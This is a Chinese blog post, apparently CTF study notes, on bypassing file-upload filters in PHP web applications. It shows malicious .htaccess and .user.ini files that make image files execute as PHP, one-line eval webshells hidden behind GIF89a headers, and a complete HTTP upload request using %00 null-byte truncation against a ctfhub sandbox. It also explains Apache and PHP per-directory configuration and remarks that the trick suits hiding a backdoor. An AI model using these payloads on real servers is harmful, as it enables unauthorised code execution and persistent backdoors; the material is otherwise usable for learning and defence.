<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>文件上传 .htaccess 与.user.ini - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="文件上传 .htaccess 与.user.ini" />
<meta property="og:description" content="1、.htaccess 1使用方法，上传.htaccess文件内容如下
&lt;FilesMatch &#34;shell&#34;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; ​ 匹配文件名为“shell”的文件，该文件作为可执行程序解析 或者
AddType application/x-httpd-php .jpg ​ ​ jpg文件作为可执行程序执行 2再上传shell.jpg
GIF89a &lt;script language=&#39;php&#39;&gt; @eval($_POST[&#39;a&#39;]);&lt;/script&gt; 3访问shell.jpg文件
2、.user.ini 方式使用限制，在上传的目录中必须包含php文件，例如index.php
1上传.user.ini文件，内容为：
GIF89a auto_prepend_file=1.gif 加载1.gif文件
2上传1.gif文件
GIF89a &lt;script language=&#39;php&#39;&gt; @eval($_POST[&#39;a&#39;]);&lt;/script&gt; 3 访问同目录中的php文件，例如index.php ，先通过本目录中的配置文件.user.ini进行加载1.gif文件从而达到加载后门的目的
3、00截断 00截断有限制，php版本得低于5.3，并且GPC得关闭，一般在url上。 两种，%00和0x00,后台读取是遇到%00就会停止。 举个例子，url中输入的是upload/post.php%00.jpg，那么后台读取到是upload/post.php，就实现了绕后目的。
POST /?road=/var/www/html/upload/1.php%00 HTTP/1.1 Host: challenge-57c0e3e249fc35a4.sandbox.ctfhub.com:10080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0 Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------47182109526658916741339492122 Content-Length: 369 Origin: http://challenge-57c0e3e249fc35a4.sandbox.ctfhub.com:10080 Connection: close Referer: http://challenge-57c0e3e249fc35a4." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/c1cbc1e9bebe99e411515f8d5608e8d4/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-03-13T08:46:16+08:00" />
<meta property="article:modified_time" content="2023-03-13T08:46:16+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">文件上传 .htaccess 与.user.ini</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2>1、.htaccess</h2> 
<p>1使用方法，上传.htaccess文件内容如下</p> 
<pre>&lt;FilesMatch "shell"&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
​
匹配文件名为“shell”的文件，该文件作为可执行程序解析</pre> 
<p>或者</p> 
<pre>AddType application/x-httpd-php .jpg
​
​
jpg文件作为可执行程序执行</pre> 
<p></p> 
<p></p> 
<p>2再上传shell.jpg</p> 
<pre>GIF89a
&lt;script language='php'&gt; @eval($_POST['a']);&lt;/script&gt;</pre> 
<p>3访问shell.jpg文件</p> 
<p></p> 
<p></p> 
<h2>2、.user.ini</h2> 
<p>方式使用限制，在上传的目录中必须包含php文件，例如index.php</p> 
<p>1上传.user.ini文件，内容为：</p> 
<pre>GIF89a                  
auto_prepend_file=1.gif</pre> 
<p>加载1.gif文件</p> 
<p>2上传1.gif文件</p> 
<pre>GIF89a
&lt;script language='php'&gt; @eval($_POST['a']);&lt;/script&gt;</pre> 
<p>3 访问同目录中的php文件，例如index.php ，先通过本目录中的配置文件.user.ini进行加载1.gif文件从而达到加载后门的目的</p> 
<h2>3、00截断</h2> 
<p>00截断有限制，php版本得低于5.3，并且GPC得关闭，一般在url上。 两种，%00和0x00,后台读取是遇到%00就会停止。 举个例子，url中输入的是upload/post.php%00.jpg，那么后台读取到是upload/post.php，就实现了绕后目的。</p> 
<pre>POST /?road=/var/www/html/upload/1.php%00 HTTP/1.1
Host: challenge-57c0e3e249fc35a4.sandbox.ctfhub.com:10080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------47182109526658916741339492122
Content-Length: 369
Origin: http://challenge-57c0e3e249fc35a4.sandbox.ctfhub.com:10080
Connection: close
Referer: http://challenge-57c0e3e249fc35a4.sandbox.ctfhub.com:10080/
Upgrade-Insecure-Requests: 1
​
-----------------------------47182109526658916741339492122
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
Content-Type: image/jpeg
​
&lt;?php @eval($_GET['hack']) ?&gt;
-----------------------------47182109526658916741339492122
Content-Disposition: form-data; name="submit"
​
Submit
-----------------------------47182109526658916741339492122--</pre> 
<h2>4、.htaccess</h2> 
<h3>.htaccess是什么</h3> 
<p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p> 
<p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 ​ 启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。 ​ 笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。 .htaccess文件可以在网站目录树的任何一个目录中，只对该文件所在目录中的文件和子目录有效。</p> 
<p>注意：</p> 
<p>1、子目录中的指令会笼盖更高级目录或者主器配置中的指令。 如果 .htaccess 文件保存在 /apache/home/www/Gunjit/ 目录，那么它会向该目录中的所有文件和子目录提供命令，但如果该目录包含一个名为 /Gunjit/images/ 子目录，且该子目录中也有一个 .htaccess 文件，那么这个子目录中的命令会覆盖父目录中 .htaccess 文件(或者目录层次结构中更上层的文件)提供的命令。</p> 
<p>.htaccess文件中的配置指令作用于.htaccess文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有.htaccess文件，而指令是按查找顺序依次生效的，所以一个特定目录下的.htaccess文件中的指令可能会覆盖其上级目录中的.htaccess文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。</p> 
<p>2、.htaccess必需以ASCII模式上传，最好将其权限设置为644。 3、使用.htaccess文件，会降低httpd服务器的一点性能</p> 
<h3>为什么要使用.htaccess</h3> 
<p>很多网站都是租用服务器和虚拟主机的，其服务器的配置我们并不能改。当我们有特殊要求时，比如定义最简单的404（页面未找到）的错误页面，我们就只能通过apache配置的扩展配置（或者说是子配置）来更改扩展原服务器的配置。这个配置就是.htaccess文件，他是apache下的http.conf文件的延续。</p> 
<h3>如何启用.htaccess</h3> 
<p>要在服务器上使用.htaccess文件配置，必须要求服务器开通对于的支持。两个条件：1.mod_rewrite模块开启；2. AllowOverride All, 如何配置：</p> 
<ol><li> <p>启用AllowOverride。打开httpd.conf, 将工作目录下的AllowOverride None 改为AllowOverride All。</p> </li></ol> 
<pre>&lt;VirtualHost *:80&gt;
    ServerName www.nhs.com
    ServerAlias nhs.com
    DocumentRoot D:/projects/htdocs/nhs/nfs_cms
    &lt;Directory  "D:/projects/htdocs/nhs/nfs_cms/"&gt;
        Options +Indexes +Includes +FollowSymLinks +MultiViews
        AllowOverride All
        Require local
    &lt;/Directory&gt;
&lt;/VirtualHost&gt;</pre> 
<p>2.. 开启.mod_rewrite模块。将#LoadModule rewrite_module modules/mod_rewrite.so前的#去掉即可。</p> 
<ol><li> <p>重启apache</p> </li></ol> 
<h3>一般情况下，不应该使用.htaccess文件</h3> 
<p>一般情况下，不应该使用.htaccess文件，除非你对主配置文件没有访问权限。建议把用户认证写在主配置文件中，而且是一种很好的方法。</p> 
<p>.htaccess文件应该被用在内容提供者需要针对特定目录改变服务器的配置而又没有root权限的情况下。如果服务器管理员不愿意频繁修改配置，则可以允许用户通过.htaccess文件自己修改配置，尤其是ISP在同一个机器上运行了多个用户站点，而又希望用户可以自己改变配置的情况下。</p> 
<p>虽然如此，一般都应该尽可能地避免使用.htaccess文件。任何希望放在.htaccess文件中的配置，都可以放在主配置文件的段中，而且更高效。</p> 
<h3>避免使用.htaccess文件有两个主要原因</h3> 
<p>1、首先是性能。 如果AllowOverride启用了.htaccess文件，则Apache需要在每个目录中查找.htaccess文件，因此，无论是否真正用到，启用.htaccess都会导致性能的下降。另外，对每一个请求，都需要读取一次.htaccess文件。还有，Apache必须在所有上级的目录中查找.htaccess文件，以使所有有效的指令都起作用， 所以，如果请求/ctusky/ctu/sky中的页面，Apache必须查找以下文件：</p> 
<pre>/.htaccess
/ctusky/.htaccess
/ctusky/ctu/.htaccess
/ctusky/ctu/sky/.htaccess　　一共就要访问4个额外的文件，就算这些文件都不存在，这也是本文开始说会影响服务器的一点性能的原因</pre> 
<p>2、其次是安全。这样会允许用户自己修改服务器的配置，这可能会导致某些意想不到的修改，所以请认真考虑是否应当给予用户这样的特权。</p> 
<pre>注意，在/www/htdocs/example目录下的.htaccess文件中放置指令，与在主配置文件中&lt;Directory /www/htdocs/example&gt;段中放置相同指令，是完全等效的。
​
/www/htdocs/example目录下的.htaccess文件的内容：
AddType text/example .exm
httpd.conf文件中摘录的内容： 　　
&lt;Directory /www/htdocs/example&gt; 　　
AddType text/example .exm 　　
&lt;/Directory&gt;
 　　
但是，把配置放在主配置文件中更加高效，因为只需要在Apache启动时读取一次，而不是在每次文件被请求时都读取。 将AllowOverride设置为none可以完全禁止使用.htaccess文件： 　　
AllowOverride None</pre> 
<p></p> 
<h3>参考文献：</h3> 
<p><a href="https://blog.csdn.net/kakuma_chen/article/details/71465251?spm=1001.2014.3001.5506" title="Apache服务器中的.htaccess文件的配置_www.test.cn_kakuma_chen的博客-CSDN博客">Apache服务器中的.htaccess文件的配置_www.test.cn_kakuma_chen的博客-CSDN博客</a></p> 
<p></p> 
<h2>5、.user.ini</h2> 
<h3>那么什么是.user.ini？</h3> 
<p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。 在此可以查看：<a href="http://php.net/manual/zh/ini.list.php" rel="nofollow" title="PHP: php.ini 配置选项列表 - Manual">PHP: php.ini 配置选项列表 - Manual</a> 这几种模式有什么区别？看看官方的解释：</p> 
<p><img alt="" height="205" src="https://images2.imgbox.com/ca/3e/4sEhLDSQ_o.png" width="850"></p> 
<p> </p> 
<p></p> 
<p>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在<a href="http://php.net/manual/zh/configuration.file.per-user.php" rel="nofollow" title="这里">这里</a>又解释了：</p> 
<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER['DOCUMENT_ROOT']</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p> 
<p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p> 
<p>这里就很清楚了，<code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p> 
<p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p> 
<p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p> 
<p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”。</p> 
<p>Php配置项中有两个比较有意思的项（下图第一、四个）：</p> 
<p><img alt="" height="171" src="https://images2.imgbox.com/b0/c8/1OEDZ49J_o.png" width="1087"></p> 
<p> </p> 
<p></p> 
<p><code>auto_append_file</code>、<code>auto_prepend_file</code>，点开看看什么意思：</p> 
<p><img alt="" height="154" src="https://images2.imgbox.com/96/51/0f78kPRT_o.png" width="1086"></p> 
<p> </p> 
<p></p> 
<p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p> 
<pre>auto_prepend_file=01.gif</pre> 
<p>01.gif是要包含的文件。</p> 
<p>所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</p> 
<p>测试一下，我分别在IIS6.0+Fastcgi+PHP5.3和nginx+fpm+php5.3上测试。 目录下有.user.ini，和包含webshell的01.gif，和正常php文件echo.php：</p> 
<p><img alt="" height="186" src="https://images2.imgbox.com/95/c9/32VWxRK9_o.png" width="789"></p> 
<p></p> 
<p><img alt="" height="208" src="https://images2.imgbox.com/43/76/zc91vldz_o.png" width="896"></p> 
<p> </p> 
<p></p> 
<p> </p> 
<p></p> 
<p></p> 
<p></p> 
<p>访问echo.php即可看到后门：</p> 
<p><img alt="" height="483" src="https://images2.imgbox.com/58/35/MWx7OcSK_o.png" width="1032"></p> 
<p> </p> 
<p></p> 
<p>Nginx下同样：</p> 
<p><img alt="" height="423" src="https://images2.imgbox.com/9b/4b/BErjsIKN_o.png" width="673"></p> 
<p> <img alt="" height="594" src="https://images2.imgbox.com/04/dc/BoxJH4IS_o.png" width="1110"></p> 
<p> </p> 
<p></p> 
<p>那么，我们可以猥琐地想一下，在哪些情况下可以用到这个姿势？ 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。</p> 
<p></p> 
<h3>参考文献</h3> 
<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" rel="nofollow" title=".user.ini文件构成的PHP后门 - phith0n">.user.ini文件构成的PHP后门 - phith0n</a></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/a391f605a3c498c2b62f9904a47965fd/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">三天吃透计算机网络面试八股文</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/a82a800527592c6fd733e4bb45b93fb7/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Openlayers 中code错误编码对应的问题</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>